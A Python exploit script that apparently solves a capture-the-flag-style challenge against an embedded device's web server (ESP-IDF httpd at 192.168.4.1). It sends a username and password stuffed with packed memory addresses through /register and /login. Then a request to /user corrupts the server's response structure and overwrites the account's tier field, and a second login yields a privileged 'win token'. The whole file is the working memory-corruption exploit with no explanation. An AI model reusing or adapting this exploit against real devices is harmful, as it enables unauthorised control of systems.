#!/usr/bin/env python3

import struct
import requests

BASE = "http://192.168.4.1"
# BASE = "http://localhost:8080"

# s_users_addr = 0x3ffb30e0 # qemu value
s_users_addr = 0x3ffb5d5c # real device value

USERNAME_BASE = s_users_addr  # &s_users[0].username
TIER_ADDR = s_users_addr + 264  # &s_users[0].tier

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
}

def post(path, **fields):
    def pe(x):
        return "".join(f"%{b:02x}" for b in x)
    f = "&".join(f"{k}={pe(v)}" for k, v in fields.items())
    return requests.post(BASE + path, data=f, timeout=5)

username = b"X" * 64
username = list(username)

# this is r->aux
# aux->content_type is at offset 32
username[0:4] = struct.pack("<I", TIER_ADDR - 32)

# this is variable r in httpd_resp_set_type
# r->aux is at offset 528
username[42:46] = struct.pack("<I", USERNAME_BASE - 528)

password = struct.pack("<I", 0) * (124 // 4) + struct.pack(
    "<I", USERNAME_BASE
)  # set ra->status to a valid string to avoid crashing in httpd_resp_send

reg = post("/register", username=username, password=password)
print("register:", reg.status_code, reg.text)

log = post("/login", username=username, password=password)
print("login:", log.status_code, log.text)
token = log.json()["token"]

try:
    print("triggering corruption via /user ...")
    r = requests.get(
        BASE + "/user", headers={"authorization": f"Bearer {token}"}, timeout=5
    )
    print(f"user:", r.status_code, r.content)
except:
    print("timed out but thats fine")

log = post("/login", username=username, password=password)
token = log.json()["token"]
print("win token:", token)
